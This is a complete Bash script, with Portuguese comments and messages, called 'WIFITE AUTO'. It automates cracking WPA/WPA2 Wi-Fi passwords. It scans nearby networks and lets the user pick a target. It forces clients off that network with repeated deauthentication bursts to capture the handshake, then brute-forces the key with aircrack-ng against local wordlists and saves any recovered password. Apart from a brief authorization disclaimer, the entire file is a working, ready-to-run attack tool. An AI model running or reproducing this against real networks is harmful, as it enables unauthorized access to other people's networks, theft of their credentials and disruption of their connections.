#!/bin/bash

################################################################################
#                                                                              #
#  ██╗    ██╗██╗███████╗██╗████████╗███████╗                                  #
#  ██║    ██║██║██╔════╝██║╚══██╔══╝██╔════╝                                  #
#  ██║ █╗ ██║██║█████╗  ██║   ██║   █████╗                                    #
#  ██║██╗╚██║██║██╔══╝  ██║   ██║   ██╔══╝                                    #
#  ╚███╔███╔╝██║██║     ██║   ██║   ███████╗                                  #
#   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝   ╚══════╝                                  #
#                                                                              #
#  WIFITE AUTO - Quebra de Senhas WiFi Automatizado                            #
#  Versão: 2.0                                                                 #
#  Funciona como wifite: escaneia, captura e quebra automaticamente          #
#                                                                              #
#  ⚠️  AVISO LEGAL: USE APENAS COM AUTORIZAÇÃO FORMAL POR ESCRITO!          #
#  Este script é apenas para fins educacionais e testes autorizados.         #
#                                                                              #
################################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Configurações globais
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="${SCRIPT_DIR}/capturas"
RESULTS_DIR="${SCRIPT_DIR}/resultados"
WORDLIST_DIR="${SCRIPT_DIR}/passwords"

# Variáveis globais
INTERFACE=""
MONITOR_INTERFACE=""
SELECTED_NETWORK=""
SELECTED_BSSID=""
SELECTED_CHANNEL=""
SELECTED_ESSID=""
CAPTURE_FILE=""
WORDLIST_ARRAY=()
WORDLISTS_TOTAL=0
WORDLISTS_TESTED=0
PASSWORD_FOUND=false
PASSWORD=""

################################################################################
# FUNÇÕES AUXILIARES
################################################################################

# Banner
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
  ██╗    ██╗██╗███████╗██╗████████╗███████╗
  ██║    ██║██║██╔════╝██║╚══██╔══╝██╔════╝
  ██║ █╗ ██║██║█████╗  ██║   ██║   █████╗
  ██║██╗╚██║██║██╔══╝  ██║   ██║   ██╔══╝
  ╚███╔███╔╝██║██║     ██║   ██║   ███████╗
   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝   ╚══════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}WIFITE AUTO - Quebra de Senhas WiFi Automatizado${NC}"
    echo -e "${RED}⚠️  USE APENAS COM AUTORIZAÇÃO!${NC}\n"
}

# Verificar se está rodando como root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Este script precisa ser executado como root (sudo)${NC}"
        exit 1
    fi
}

# Verificar dependências
check_dependencies() {
    local missing=0
    
    echo -e "${BLUE}[*] Verificando dependências...${NC}"
    
    for tool in airmon-ng airodump-ng aireplay-ng aircrack-ng iwconfig; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}[!] $tool não encontrado${NC}"
            missing=1
        fi
    done
    
    if [[ $missing -eq 1 ]]; then
        echo -e "${YELLOW}[*] Instalando aircrack-ng...${NC}"
        apt-get update && apt-get install -y aircrack-ng
    else
        echo -e "${GREEN}[+] Todas as dependências estão instaladas${NC}"
    fi
}

# Detectar interface Wi-Fi
detect_interface() {
    echo -e "${BLUE}[*] Detectando interfaces Wi-Fi...${NC}"
    
    local interfaces=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^$' | grep -v 'lo')
    
    if [[ -z "$interfaces" ]]; then
        echo -e "${RED}[!] Nenhuma interface Wi-Fi encontrada${NC}"
        exit 1
    fi
    
    echo -e "${CYAN}Interfaces disponíveis:${NC}"
    local count=1
    local if_array=()
    
    for iface in $interfaces; do
        echo -e "${GREEN}  [$count] $iface${NC}"
        if_array+=("$iface")
        ((count++))
    done
    
    if [[ ${#if_array[@]} -eq 1 ]]; then
        INTERFACE=${if_array[0]}
        echo -e "${GREEN}[+] Usando interface: $INTERFACE${NC}"
    else
        echo -ne "${YELLOW}[?] Escolha a interface (1-${#if_array[@]}): ${NC}"
        read choice
        if [[ $choice -ge 1 && $choice -le ${#if_array[@]} ]]; then
            INTERFACE=${if_array[$((choice-1))]}
            echo -e "${GREEN}[+] Interface selecionada: $INTERFACE${NC}"
        else
            echo -e "${RED}[!] Escolha inválida${NC}"
            exit 1
        fi
    fi
}

# Detectar interface monitor criada
detect_monitor_interface() {
    local base_interface="$1"
    local monitor_iface=""
    
    sleep 3
    
    # Verificar todas as interfaces em modo monitor
    local all_interfaces=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^$')
    for iface in $all_interfaces; do
        if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
            if [[ "$iface" == *"$base_interface"* ]] || [[ "$iface" == "mon"* ]]; then
                monitor_iface="$iface"
                break
            fi
        fi
    done
    
    # Tentar variações comuns
    if [[ -z "$monitor_iface" ]]; then
        local variations=(
            "${base_interface}mon"
            "${base_interface}mon0"
            "${base_interface}mon1"
            "mon0"
            "mon1"
            "wlan0mon"
            "wlan1mon"
        )
        
        for iface in "${variations[@]}"; do
            if iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
                monitor_iface="$iface"
                break
            fi
        done
    fi
    
    echo "$monitor_iface"
}

# Colocar interface em modo monitor
enable_monitor_mode() {
    echo -e "${BLUE}[*] Colocando interface em modo monitor...${NC}"
    
    # Verificar se já está em modo monitor
    if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${GREEN}[+] Interface já está em modo monitor${NC}"
        MONITOR_INTERFACE="$INTERFACE"
        return 0
    fi
    
    # Matar processos que podem interferir
    echo -e "${YELLOW}[*] Matando processos que podem interferir...${NC}"
    airmon-ng check kill &> /dev/null
    sleep 2
    
    # Iniciar modo monitor
    echo -e "${YELLOW}[*] Iniciando modo monitor em $INTERFACE...${NC}"
    airmon-ng start "$INTERFACE" &> /dev/null
    sleep 2
    
    # Detectar interface monitor criada
    MONITOR_INTERFACE=$(detect_monitor_interface "$INTERFACE")
    
    if [[ -z "$MONITOR_INTERFACE" ]]; then
        echo -e "${RED}[!] Falha ao detectar interface monitor${NC}"
        iwconfig 2>/dev/null | grep -E "^[a-z]|Mode:"
        exit 1
    fi
    
    if ! iwconfig "$MONITOR_INTERFACE" &> /dev/null; then
        echo -e "${RED}[!] Interface monitor não existe: $MONITOR_INTERFACE${NC}"
        exit 1
    fi
    
    if ! iwconfig "$MONITOR_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}[!] Interface $MONITOR_INTERFACE não está em modo monitor${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Modo monitor ativado: $MONITOR_INTERFACE${NC}"
}

# Encontrar todas as wordlists de passwords e ordenar por tamanho
find_all_wordlists() {
    echo -e "${BLUE}[*] Procurando todas as wordlists de passwords...${NC}"
    
    # Debug: mostrar caminhos
    echo -e "${CYAN}[*] SCRIPT_DIR: $SCRIPT_DIR${NC}"
    echo -e "${CYAN}[*] WORDLIST_DIR configurado: $WORDLIST_DIR${NC}"
    
    # Verificar se diretório existe
    if [[ ! -d "$WORDLIST_DIR" ]]; then
        echo -e "${YELLOW}[!] Diretório não encontrado no caminho configurado${NC}"
        echo -e "${YELLOW}[*] Verificando caminhos alternativos...${NC}"
        
        # Tentar caminhos alternativos
        local alt_paths=(
            "${SCRIPT_DIR}/passwords"
            "$(dirname "$SCRIPT_DIR")/wifi/passwords"
            "${SCRIPT_DIR}/../wifi/passwords"
            "${SCRIPT_DIR}/../Kali/Ferramentas/wordlists/wordlists/passwords"
            "./passwords"
            "$(pwd)/wifi/passwords"
        )
        
        for alt_path in "${alt_paths[@]}"; do
            # Resolver caminho absoluto
            local resolved_path=$(cd "$alt_path" 2>/dev/null && pwd)
            if [[ -n "$resolved_path" && -d "$resolved_path" ]]; then
                echo -e "${GREEN}[+] Diretório encontrado em: $resolved_path${NC}"
                WORDLIST_DIR="$resolved_path"
                break
            fi
        done
        
        # Se ainda não encontrou, tentar buscar recursivamente
        if [[ ! -d "$WORDLIST_DIR" ]]; then
            echo -e "${YELLOW}[*] Buscando pasta 'passwords' recursivamente...${NC}"
            local found_dir=$(find "$(dirname "$SCRIPT_DIR")" -type d -name "passwords" 2>/dev/null | grep -i "wifi.*passwords\|passwords" | head -1)
            if [[ -n "$found_dir" && -d "$found_dir" ]]; then
                echo -e "${GREEN}[+] Diretório encontrado em: $found_dir${NC}"
                WORDLIST_DIR="$found_dir"
            fi
        fi
        
        # Se ainda não encontrou, sair
        if [[ ! -d "$WORDLIST_DIR" ]]; then
            echo -e "${RED}[!] Nenhum diretório de wordlists encontrado${NC}"
            echo -e "${YELLOW}[*] Caminhos testados:${NC}"
            for alt_path in "${alt_paths[@]}"; do
                local resolved=$(cd "$alt_path" 2>/dev/null && pwd || echo "NÃO ENCONTRADO")
                echo -e "${YELLOW}    - $alt_path -> $resolved${NC}"
            done
            echo -e "${YELLOW}[*] Diretório atual: $(pwd)${NC}"
            echo -e "${YELLOW}[*] Tente criar a pasta 'passwords' na mesma pasta do script${NC}"
            exit 1
        fi
    fi
    
    # Resolver caminho absoluto
    WORDLIST_DIR=$(cd "$WORDLIST_DIR" && pwd)
    echo -e "${GREEN}[+] Usando diretório: $WORDLIST_DIR${NC}"
    
    # Verificar se há arquivos .txt no diretório
    local file_count=$(ls -1 "$WORDLIST_DIR"/*.txt 2>/dev/null | wc -l)
    echo -e "${CYAN}[*] Arquivos .txt encontrados: $file_count${NC}"
    
    if [[ $file_count -eq 0 ]]; then
        echo -e "${RED}[!] Nenhum arquivo .txt encontrado em: $WORDLIST_DIR${NC}"
        echo -e "${YELLOW}[*] Listando conteúdo do diretório:${NC}"
        ls -la "$WORDLIST_DIR" 2>/dev/null | head -10
        exit 1
    fi
    
    local wordlist_array=()
    local temp_file="/tmp/wordlists_sorted_$$.txt"
    
    # Método 1: Usar find
    echo -e "${CYAN}[*] Buscando wordlists com 'find'...${NC}"
    local find_count=0
    while IFS= read -r file; do
        [[ -z "$file" ]] && continue
        
        local size=0
        if [[ "$OSTYPE" == "darwin"* ]]; then
            size=$(stat -f%z "$file" 2>/dev/null)
        else
            size=$(stat -c%s "$file" 2>/dev/null)
        fi
        
        if [[ -n "$size" && $size -gt 0 ]]; then
            echo "$size|$file" >> "$temp_file"
            ((find_count++))
        fi
    done < <(find "$WORDLIST_DIR" -maxdepth 1 -type f -name "*.txt" 2>/dev/null)
    
    # Método 2: Se find não encontrou nada, usar ls
    if [[ $find_count -eq 0 ]]; then
        echo -e "${YELLOW}[*] 'find' não encontrou arquivos, tentando com 'ls'...${NC}"
        for file in "$WORDLIST_DIR"/*.txt; do
            [[ ! -f "$file" ]] && continue
            
            local size=0
            if [[ "$OSTYPE" == "darwin"* ]]; then
                size=$(stat -f%z "$file" 2>/dev/null)
            else
                size=$(stat -c%s "$file" 2>/dev/null)
            fi
            
            if [[ -n "$size" && $size -gt 0 ]]; then
                echo "$size|$file" >> "$temp_file"
                ((find_count++))
            fi
        done
    fi
    
    if [[ ! -f "$temp_file" ]] || [[ ! -s "$temp_file" ]]; then
        echo -e "${RED}[!] Nenhuma wordlist encontrada em: $WORDLIST_DIR${NC}"
        echo -e "${YELLOW}[*] Verificando permissões...${NC}"
        ls -la "$WORDLIST_DIR" | head -5
        exit 1
    fi
    
    echo -e "${GREEN}[+] Encontradas $find_count wordlists${NC}"
    
    # Ordenar por tamanho (menores primeiro) e extrair caminhos
    # Usar mapfile para popular array corretamente
    mapfile -t wordlist_array < <(sort -n -t'|' -k1 "$temp_file" | cut -d'|' -f2)
    
    rm -f "$temp_file"
    
    WORDLIST_ARRAY=("${wordlist_array[@]}")
    WORDLISTS_TOTAL=${#WORDLIST_ARRAY[@]}
    
    if [[ $WORDLISTS_TOTAL -eq 0 ]]; then
        echo -e "${RED}[!] Nenhuma wordlist válida encontrada${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Encontradas $WORDLISTS_TOTAL wordlists${NC}"
    echo -e "${CYAN}[*] Ordenadas por tamanho (menores primeiro)${NC}"
    echo ""
    
    # Mostrar primeiras 5 wordlists
    echo -e "${YELLOW}Primeiras wordlists que serão testadas:${NC}"
    local count=1
    for wordlist in "${WORDLIST_ARRAY[@]:0:5}"; do
        local size=0
        if [[ "$OSTYPE" == "darwin"* ]]; then
            size=$(stat -f%z "$wordlist" 2>/dev/null)
        else
            size=$(stat -c%s "$wordlist" 2>/dev/null)
        fi
        local size_mb=$((size / 1024 / 1024))
        local line_count=$(wc -l < "$wordlist" 2>/dev/null | tr -d ' ')
        echo -e "${CYAN}  [$count] $(basename "$wordlist") - ${size_mb} MB - ${line_count} linhas${NC}"
        ((count++))
    done
    
    if [[ $WORDLISTS_TOTAL -gt 5 ]]; then
        echo -e "${CYAN}  ... e mais $((WORDLISTS_TOTAL - 5)) wordlists${NC}"
    fi
    echo ""
}

# Escanear redes Wi-Fi e mostrar lista
scan_networks() {
    echo -e "${BLUE}[*] Escaneando redes Wi-Fi...${NC}"
    echo -e "${YELLOW}[*] Aguarde alguns segundos...${NC}\n"
    
    mkdir -p "$OUTPUT_DIR"
    local scan_file="${OUTPUT_DIR}/scan_${TIMESTAMP}"
    
    # Executar airodump-ng por 15 segundos
    echo -e "${CYAN}[*] Escaneando por 15 segundos...${NC}"
    timeout 15 airodump-ng -w "$scan_file" --output-format csv "$MONITOR_INTERFACE" &> /dev/null &
    local scan_pid=$!
    
    # Mostrar progresso
    for i in {1..15}; do
        sleep 1
        echo -ne "\r${CYAN}[*] Escaneando... ${i}/15 segundos${NC}"
    done
    echo ""
    
    wait $scan_pid 2>/dev/null
    
    # Parsear CSV e mostrar redes
    local csv_file="${scan_file}-01.csv"
    
    if [[ ! -f "$csv_file" ]]; then
        echo -e "${RED}[!] Erro ao escanear redes${NC}"
        return 1
    fi
    
    echo -e "\n${CYAN}${BOLD}=== REDES WIFI ENCONTRADAS ===${NC}\n"
    printf "${GREEN}%3s | %-18s | %5s | %4s | %-20s${NC}\n" "Num" "BSSID" "Canal" "PWR" "ESSID"
    echo -e "${GREEN}-----+--------------------+-------+------+----------------------${NC}"
    
    local count=1
    local networks=()
    local in_stations=false
    
    # Ler CSV linha por linha
    while IFS= read -r line; do
        # Detectar início da seção de estações
        if [[ "$line" =~ ^Station ]]; then
            in_stations=true
            continue
        fi
        
        # Pular seção de estações
        [[ "$in_stations" == true ]] && continue
        
        # Pular linhas vazias ou cabeçalho
        [[ -z "$line" ]] && continue
        [[ "$line" =~ ^BSSID ]] && continue
        
        # Parsear linha CSV (formato pode variar)
        local bssid=$(echo "$line" | cut -d',' -f1 | tr -d ' ')
        local channel=$(echo "$line" | cut -d',' -f4 | tr -d ' ')
        local power=$(echo "$line" | cut -d',' -f9 | tr -d ' ')
        local privacy=$(echo "$line" | cut -d',' -f6 | tr -d ' ')
        local essid=$(echo "$line" | cut -d',' -f14- | tr -d ' ' | head -c 20)
        
        # Validar BSSID (formato MAC)
        if [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
            continue
        fi
        
        # Filtrar apenas WPA/WPA2
        if [[ "$privacy" =~ WPA ]] || [[ "$privacy" =~ WPA2 ]]; then
            # Se ESSID estiver vazio, usar "Hidden"
            [[ -z "$essid" ]] && essid="(Hidden)"
            
            printf "${CYAN}%3d${NC} | ${YELLOW}%-18s${NC} | ${GREEN}%5s${NC} | ${YELLOW}%4s${NC} | ${GREEN}%-20s${NC}\n" \
                   "$count" "$bssid" "$channel" "$power" "$essid"
            
            networks+=("$bssid|$channel|$essid")
            ((count++))
        fi
    done < "$csv_file"
    
    # Limpar arquivo temporário
    rm -f "${scan_file}"*.csv "${scan_file}"*.kismet.csv &> /dev/null
    
    if [[ ${#networks[@]} -eq 0 ]]; then
        echo -e "${RED}[!] Nenhuma rede WPA/WPA2 encontrada${NC}"
        echo -e "${YELLOW}[*] Tente escanear novamente${NC}"
        return 1
    fi
    
    echo ""
    echo -ne "${YELLOW}[?] Escolha uma rede para atacar (1-${#networks[@]}) ou 0 para escanear novamente: ${NC}"
    read choice
    
    if [[ "$choice" == "0" ]]; then
        scan_networks
        return
    fi
    
    if [[ $choice -ge 1 && $choice -le ${#networks[@]} ]]; then
        local selected="${networks[$((choice-1))]}"
        SELECTED_BSSID=$(echo "$selected" | cut -d'|' -f1)
        SELECTED_CHANNEL=$(echo "$selected" | cut -d'|' -f2)
        SELECTED_ESSID=$(echo "$selected" | cut -d'|' -f3)
        
        echo -e "\n${GREEN}[+] Rede selecionada:${NC}"
        echo -e "${CYAN}    ESSID: $SELECTED_ESSID${NC}"
        echo -e "${CYAN}    BSSID: $SELECTED_BSSID${NC}"
        echo -e "${CYAN}    Canal: $SELECTED_CHANNEL${NC}"
    else
        echo -e "${RED}[!] Escolha inválida${NC}"
        return 1
    fi
}

# Capturar handshake automaticamente
capture_handshake_auto() {
    echo -e "\n${BLUE}[*] Iniciando captura de handshake...${NC}"
    
    CAPTURE_FILE="${OUTPUT_DIR}/captura_${SELECTED_ESSID}_${TIMESTAMP}"
    
    echo -e "${CYAN}[*] Arquivo: ${CAPTURE_FILE}.cap${NC}"
    echo -e "${YELLOW}[*] Capturando handshake...${NC}\n"
    
    # Iniciar airodump-ng em background
    airodump-ng -c "$SELECTED_CHANNEL" --bssid "$SELECTED_BSSID" \
                -w "$CAPTURE_FILE" "$MONITOR_INTERFACE" &> /dev/null &
    local airodump_pid=$!
    
    sleep 3
    
    # Tentar capturar handshake com deauth
    local max_attempts=5
    local attempt=1
    local handshake_captured=false
    
    while [[ $attempt -le $max_attempts && "$handshake_captured" == false ]]; do
        echo -e "${YELLOW}[*] Tentativa $attempt/$max_attempts: Executando deauth...${NC}"
        
        # Executar deauth
        aireplay-ng --deauth 5 -a "$SELECTED_BSSID" "$MONITOR_INTERFACE" &> /dev/null
        
        sleep 2
        
        # Verificar se handshake foi capturado
        local cap_file="${CAPTURE_FILE}-01.cap"
        if [[ -f "$cap_file" ]]; then
            local result=$(aircrack-ng "$cap_file" 2>&1 | grep -i "handshake\|1 handshake")
            if [[ -n "$result" ]]; then
                handshake_captured=true
                echo -e "${GREEN}[+] ✓ Handshake capturado com sucesso!${NC}"
                break
            fi
        fi
        
        ((attempt++))
        sleep 2
    done
    
    # Parar airodump-ng
    kill $airodump_pid 2>/dev/null
    wait $airodump_pid 2>/dev/null
    
    if [[ "$handshake_captured" == false ]]; then
        echo -e "${RED}[!] Não foi possível capturar handshake após $max_attempts tentativas${NC}"
        echo -e "${YELLOW}[*] Tentando continuar mesmo assim...${NC}"
    fi
    
    CAPTURE_FILE="${CAPTURE_FILE}-01.cap"
}

# Testar wordlist individual
test_wordlist() {
    local wordlist="$1"
    local wordlist_name=$(basename "$wordlist")
    
    WORDLISTS_TESTED=$((WORDLISTS_TESTED + 1))
    
    echo ""
    echo -e "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}[*] Testando wordlist [$WORDLISTS_TESTED/$WORDLISTS_TOTAL]: $wordlist_name${NC}"
    echo -e "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # Mostrar informações da wordlist
    local size=0
    if [[ "$OSTYPE" == "darwin"* ]]; then
        size=$(stat -f%z "$wordlist" 2>/dev/null)
    else
        size=$(stat -c%s "$wordlist" 2>/dev/null)
    fi
    local size_mb=$((size / 1024 / 1024))
    local line_count=$(wc -l < "$wordlist" 2>/dev/null | tr -d ' ')
    
    echo -e "${CYAN}[*] Tamanho: ${size_mb} MB | Linhas: ${line_count}${NC}"
    echo ""
    
    # Executar aircrack-ng
    echo -e "${GREEN}[+] Executando aircrack-ng...${NC}"
    echo -e "${CYAN}Comando: aircrack-ng -w \"$wordlist\" -b \"$SELECTED_BSSID\" \"$CAPTURE_FILE\"${NC}\n"
    
    # Capturar output (redirecionar stderr também)
    aircrack-ng -w "$wordlist" -b "$SELECTED_BSSID" "$CAPTURE_FILE" > /tmp/aircrack_output_$$.txt 2>&1
    
    # Verificar se senha foi encontrada
    if grep -qi "KEY FOUND\|KEY FOUND!" /tmp/aircrack_output_$$.txt 2>/dev/null; then
        PASSWORD_FOUND=true
        
        # Extrair senha
        PASSWORD=$(grep -i "KEY FOUND" /tmp/aircrack_output_$$.txt | \
                   sed -n 's/.*\[\([^]]*\)\].*/\1/p' | head -1)
        
        if [[ -z "$PASSWORD" ]]; then
            PASSWORD=$(grep -i "KEY FOUND" /tmp/aircrack_output_$$.txt | \
                      grep -oE '\[[^]]+\]' | sed 's/\[//;s/\]//' | head -1)
        fi
        
        echo ""
        echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}${BOLD}            🎉 SENHA ENCONTRADA! 🎉${NC}"
        echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}ESSID: ${BOLD}${GREEN}$SELECTED_ESSID${NC}${CYAN}${NC}"
        echo -e "${CYAN}BSSID: $SELECTED_BSSID${NC}"
        echo -e "${CYAN}Senha: ${BOLD}${GREEN}$PASSWORD${NC}${CYAN}${NC}"
        echo -e "${CYAN}Wordlist: $wordlist_name${NC}"
        echo -e "${CYAN}Wordlists testadas: $WORDLISTS_TESTED/$WORDLISTS_TOTAL${NC}"
        echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
        echo ""
        
        # Salvar resultado
        mkdir -p "$RESULTS_DIR"
        local result_file="${RESULTS_DIR}/resultado_${SELECTED_ESSID}_${TIMESTAMP}.txt"
        {
            echo "═══════════════════════════════════════════════════════════"
            echo "            SENHA ENCONTRADA - WIFITE AUTO"
            echo "═══════════════════════════════════════════════════════════"
            echo "Data: $(date)"
            echo "ESSID: $SELECTED_ESSID"
            echo "BSSID: $SELECTED_BSSID"
            echo "Canal: $SELECTED_CHANNEL"
            echo "Senha: $PASSWORD"
            echo "Wordlist: $wordlist"
            echo "Wordlist (nome): $wordlist_name"
            echo "Wordlists testadas: $WORDLISTS_TESTED/$WORDLISTS_TOTAL"
            echo "Arquivo .cap: $CAPTURE_FILE"
            echo "═══════════════════════════════════════════════════════════"
        } > "$result_file"
        
        echo -e "${GREEN}[+] Resultado salvo em: $result_file${NC}"
        
        rm -f /tmp/aircrack_output_$$.txt
        return 0
    fi
    
    rm -f /tmp/aircrack_output_$$.txt
    return 1
}

# Quebrar senha testando todas as wordlists
crack_password() {
    if [[ ! -f "$CAPTURE_FILE" ]]; then
        echo -e "${RED}[!] Arquivo de captura não encontrado${NC}"
        return 1
    fi
    
    if [[ ${#WORDLIST_ARRAY[@]} -eq 0 ]]; then
        echo -e "${RED}[!] Nenhuma wordlist carregada${NC}"
        return 1
    fi
    
    echo -e "\n${BLUE}[*] Iniciando quebra de senha...${NC}"
    echo -e "${CYAN}[*] Arquivo: $CAPTURE_FILE${NC}"
    echo -e "${CYAN}[*] Total de wordlists: $WORDLISTS_TOTAL${NC}"
    echo -e "${YELLOW}[*] Testando wordlists em ordem (menores primeiro)${NC}"
    echo -e "${YELLOW}[*] Isso pode levar muito tempo...${NC}\n"
    
    WORDLISTS_TESTED=0
    PASSWORD_FOUND=false
    
    # Testar cada wordlist
    for wordlist in "${WORDLIST_ARRAY[@]}"; do
        if [[ "$PASSWORD_FOUND" == true ]]; then
            break
        fi
        
        test_wordlist "$wordlist"
        
        # Pequena pausa entre wordlists
        sleep 1
    done
    
    # Resultado final
    echo ""
    if [[ "$PASSWORD_FOUND" == true ]]; then
        echo -e "${GREEN}[+] Quebra de senha concluída com sucesso!${NC}"
        echo -e "${GREEN}[+] Senha encontrada: $PASSWORD${NC}"
    else
        echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${RED}[!] Senha não encontrada após testar $WORDLISTS_TESTED wordlists${NC}"
        echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}[*] Possíveis causas:${NC}"
        echo -e "${YELLOW}    - A senha não está em nenhuma wordlist testada${NC}"
        echo -e "${YELLOW}    - A senha é muito complexa/forte${NC}"
        echo -e "${YELLOW}    - O handshake pode estar incompleto${NC}"
        
        # Salvar relatório de falha
        mkdir -p "$RESULTS_DIR"
        local result_file="${RESULTS_DIR}/senha_nao_encontrada_${SELECTED_ESSID}_${TIMESTAMP}.txt"
        {
            echo "═══════════════════════════════════════════════════════════"
            echo "         SENHA NÃO ENCONTRADA - WIFITE AUTO"
            echo "═══════════════════════════════════════════════════════════"
            echo "Data: $(date)"
            echo "ESSID: $SELECTED_ESSID"
            echo "BSSID: $SELECTED_BSSID"
            echo "Canal: $SELECTED_CHANNEL"
            echo "Total de wordlists testadas: $WORDLISTS_TESTED"
            echo "Arquivo .cap: $CAPTURE_FILE"
            echo "═══════════════════════════════════════════════════════════"
        } > "$result_file"
        
        echo -e "${CYAN}[*] Relatório salvo em: $result_file${NC}"
    fi
}

# Restaurar interface ao modo normal
restore_interface() {
    echo -e "\n${BLUE}[*] Restaurando interface ao modo normal...${NC}"
    
    if [[ -n "$MONITOR_INTERFACE" ]]; then
        airmon-ng stop "$MONITOR_INTERFACE" &> /dev/null
        echo -e "${GREEN}[+] Interface restaurada${NC}"
    fi
    
    if command -v systemctl &> /dev/null; then
        systemctl start NetworkManager &> /dev/null 2>&1
    fi
}

################################################################################
# FUNÇÃO PRINCIPAL
################################################################################

main() {
    show_banner
    check_root
    check_dependencies
    
    # Trap para restaurar interface ao sair
    trap restore_interface EXIT INT TERM
    
    # Criar diretórios
    mkdir -p "$OUTPUT_DIR" "$RESULTS_DIR"
    
    # Detectar interface e ativar modo monitor
    detect_interface
    enable_monitor_mode
    
    # Encontrar todas as wordlists
    find_all_wordlists
    
    # Loop principal
    while true; do
        # Escanear redes
        if ! scan_networks; then
            echo -e "${YELLOW}[*] Nenhuma rede encontrada. Tentando novamente...${NC}"
            sleep 2
            continue
        fi
        
        # Capturar handshake
        capture_handshake_auto
        
        # Quebrar senha
        crack_password
        
        echo ""
        echo -ne "${YELLOW}[?] Atacar outra rede? [s/N]: ${NC}"
        read continue_choice
        if [[ ! "$continue_choice" =~ ^[Ss] ]]; then
            break
        fi
        
        echo ""
    done
    
    echo -e "${GREEN}[+] Finalizando...${NC}"
    restore_interface
}

# Executar script
main "$@"

